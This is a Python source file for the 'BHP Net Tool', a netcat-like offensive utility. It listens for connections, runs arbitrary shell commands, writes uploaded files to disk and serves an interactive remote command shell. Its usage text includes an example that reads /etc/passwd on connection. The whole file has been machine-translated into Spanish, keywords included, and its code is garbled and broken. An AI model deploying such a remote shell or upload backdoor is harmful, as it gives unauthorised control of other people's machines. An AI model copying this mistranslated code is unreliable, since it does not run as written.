importar  sys
importar  socket
importar  getopt
importar  subprocesos
 subproceso de importación


# definir algunas variables globales
escuchar 				=  Falso
comando 				=  Falso
upload 				=  False
ejecutar 				=  ""
target 				=  ""
upload_destination 	=  ""
puerto 				=  0

def  uso ():
	imprimir  "BHP Net Tool"
	imprimir
	imprimir  "Uso: bhpnet.py -t target_host -p puerto"
	print  "-l --escucha - escucha en [host]: [puerto] para conexiones entrantes"
	print  "-e --execute = file_to_run - ejecuta el archivo dado al recibir una conexión"
	print  "-c --command - inicializar un comando shell"
	imprimir  "-u --upload = destino - al recibir la conexión cargue un archivo y escriba en [destino]"
	imprimir
	imprimir
	imprimir  "Ejemplos:"
	imprimir  "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
	imprimir  "bhpnet.py -t 192.168.0.1 -p 5555 -l -u = c: \\ target.exe"
	imprimir  "bhpnet.py -t 192.168.0.1 -p 5555 -l -e = \" cat / etc / passwd \ " "
	imprimir  "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
	sys . salir ( 0 )

def  main ():
	 escucha global
	 puerto global
	 ejecución global
	 comando global
	 upload_destination global
	 objetivo global

	si  no es  len ( sys . argv [ 1 :]):
		uso ()

	# leer las opciones de la línea de comandos
	prueba :
		opts , args  =  getopt . getopt ( sys . argv [ 1 :], "hle: t: p: cu:" , [ "ayuda" , "escuchar" , "ejecutar" , "destino" , "puerto" , "comando" , "cargar" ] )
	excepto  getopt . GetoptError  como  err :
		print  str ( err )
		uso ()


	para  o , a  en  opta :
		si  o  en ( "-h" , "--ayuda" ):
			uso ()
		elif  o  en ( "-l" , "--escucha" ):
			escuchar  =  Verdadero
		elif  o  en ( "-e" , "--execute" ):
			ejecutar  =  a
		elif  o  en ( "-c" , "--commandshell" ):
			comando  =  Verdadero
		elif  o  en ( "-u" , "--upload" ):
			upload_destination  =  a
		elif  o  en ( "-t" , "--target" ):
			objetivo  =  a
		elif  o  en ( "-p" , "--port" ):
			puerto  =  int ( a )
		otra cosa :
			afirmar  Falso , "Opción no controlada"

	# ¿Vamos a escuchar o simplemente enviar datos desde stdin?
	si  no  escucha  y  len ( destino ) y  puerto  >  0 :

		# leer en el búfer desde la línea de comandos
		# esto se bloqueará, así que envíe CTRL-D si no envía la entrada
		# a stdin
		buffer  =  sys . stdin . leer ()

		# enviar datos
		client_sender ( búfer )

	# vamos a escuchar y potencialmente
	# cargar cosas, ejecutar comandos y soltar un shell de regreso
	# dependiendo de nuestras opciones de línea de comando anteriores
	si  escucha :
		server_loop ()

def  client_sender ( búfer ):

	cliente  =  socket . enchufe ( enchufe . AF_INET , enchufe . SOCK_STREAM )

	prueba :
		# conectarse a nuestro host de destino
		cliente . conectar (( destino , puerto ))

		si  len ( búfer ):
			cliente . enviar ( búfer )
		mientras que es  verdadero :

			# ahora espera a que te devuelvan los datos
			recv_len  =  1
			respuesta  =  ""

			mientras  recv_len :

				datos 		 =  cliente , recv ( 4096 )
				recv_len  	 =  len ( datos )
				respuesta 	+ = 	datos

				si  recv_len  <  4096 :
					descanso

			 respuesta de impresión ,

			# espere más información
			buffer  =  raw_input ( "" )
			búfer  + =  " \ n "

			# envíalo
			cliente . enviar ( búfer )


	excepto :

		imprimir  "[*] ¡Excepción! Saliendo".

		# derribar la conexión
		cliente . cerrar ()

def  server_loop ():
	 objetivo global

	# si no se define ningún objetivo, escuchamos en todas las interfaces
	si  no  len ( objetivo ):
		objetivo  =  "0.0.0.0"

	servidor  =  enchufe . enchufe ( enchufe . AF_INET , enchufe . SOCK_STREAM )
	servidor . enlazar (( destino , puerto ))

	servidor . escuchar ( 5 )

	mientras que es  verdadero :
		cliente . socket , addr  =  servidor . aceptar ()

		# girar un hilo para manejar nuestro nuevo cliente
		client_thread  =  subprocesamiento . Subproceso ( target = client_handler , args = ( client_socket ,))
		hilo_cliente . inicio ()

def  run_command ( comando ):

	# recortar la nueva línea
	comando  =  comando . rstrip ()

	# ejecuta el comando y recupera la salida
	prueba :
		salida  =  subproceso . check_output ( comando , stderr = subproceso . STDOUT , shell = True )
	excepto :
		output  =  "No se pudo ejecutar el comando. \ r \ n "

	# enviar la salida al cliente
	 salida de retorno

def  manejador_cliente ( toma_cliente ):
	 carga global
	 ejecución global
	 comando global

	# comprobar la carga
	si  len ( upload_destination ):

		# leer todos los bytes y escribir en nuestro destino
		file_buffer  =  ""

		# sigue leyendo datos hasta que no haya ninguno disponible
		mientras que es  verdadero :
			datos  =  conector_cliente . recv ( 1024 )

			si  no son  datos :
				descanso
			otra cosa :
				file_buffer  + =  datos

		# ahora tomamos estos bytes e intentamos escribirlos
		prueba :
			file_descriptor  =  open ( upload_destination , "wb" )
			file_descriptor . escribir ( file_buffer )
			file_descriptor . cerrar ()

			# reconozca que escribimos el archivo
			client_socket . send ( "Archivo guardado  correctamente en% s \ r \ n " %  upload_destination )
		excepto :
			client_socket . enviar ( "No se pudo guardar el archivo en% s \ r \ n "  %  upload_destination )


	# comprobar la ejecución del comando
	si  len ( ejecutar ):

		# ejecutar el comando
		salida  =  run_command ( ejecutar )

		client_socket . enviar ( salida )


	# ahora vamos a otro bucle si se solicitó un shell de comandos
	si  comando :

		mientras que es  verdadero :
			# mostrar un mensaje simple
			client_socket . enviar ( "<BHP: #>" )

				# ahora recibimos hasta que veamos un salto de línea (tecla enter)
			cmd_buffer  =  ""
			mientras que  " \ n "  no está  en  cmd_buffer :
				cmd_buffer  + =  client_socket . recv ( 1024 )


			# enviar de vuelta la salida del comando
			respuesta  =  comando_correr ( cmd_buffer )

			# devuelve la respuesta
			client_socket . enviar ( respuesta )

principal ()